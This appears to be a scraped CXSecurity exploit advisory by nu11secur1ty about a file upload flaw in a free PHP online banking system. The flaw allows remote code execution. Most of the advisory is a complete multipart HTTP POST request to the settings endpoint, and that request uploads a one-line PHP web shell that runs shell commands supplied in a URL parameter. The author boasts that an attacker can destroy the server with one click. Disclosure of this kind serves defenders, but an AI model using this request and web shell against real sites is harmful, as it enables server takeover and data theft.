---
title: OBS (by: oretnom23 ) File Upload-FU and Remote
url: https://cxsecurity.com/issue/WLB-2025010017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-19
fetch_date: 2025-10-06T20:04:38.981457
---

# OBS (by: oretnom23 ) File Upload-FU and Remote

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OBS (by: oretnom23 ) File Upload-FU and Remote** **2025.01.18**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: OBS (by: oretnom23 ) v1.0 -Copyright © 2025. All rights reserved.
### File Upload-FU and Remote Code Execution-RCE Vulnerabilities
# Author: nu11secur1ty
# Date: 01/16/2025
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php/14868/banking-system-using-php-free-source-code.html#comment-105993
# Reference: https://portswigger.net/web-security/file-upload | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
## Description:
The update\_settings app with parameter "cimg" is vulnerable for File Upload and then Remote Code Execution without any execution permission sanitizing.
The attacker can upload absolutely DANGEROUS files on that server and he can destroy it with one click!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- RCE Exploit:
```RCE
POST /pwnedhost/banking/classes/SystemSettings.php?f=update\_settings HTTP/1.1
Host: 192.168.100.45
Cookie: PHPSESSID=7fd63jibgrngca52b9tpmi5psc
Content-Length: 853
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not\_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: \*/\*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6HD3dRMlU2C2zVV3
Origin: https://192.168.100.45
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.100.45/pwnedhost/banking/admin/?page=system\_info
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
------WebKitFormBoundary6HD3dRMlU2C2zVV3
Content-Disposition: form-data; name="name"
Online Banking System
------WebKitFormBoundary6HD3dRMlU2C2zVV3
Content-Disposition: form-data; name="short\_name"
OBS
------WebKitFormBoundary6HD3dRMlU2C2zVV3
Content-Disposition: form-data; name="about\_us"
<p>Sample About Us</p>
------WebKitFormBoundary6HD3dRMlU2C2zVV3
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundary6HD3dRMlU2C2zVV3
Content-Disposition: form-data; name="img"; filename="RCE.php"
Content-Type: application/octet-stream
<?php echo shell\_exec($\_GET["cmd"]);?>
------WebKitFormBoundary6HD3dRMlU2C2zVV3
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundary6HD3dRMlU2C2zVV3--
```
# Reproduce:
[href](https://www.patreon.com/posts/obs-by-oretnom23-120115999)
## Time spent:
00:35:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top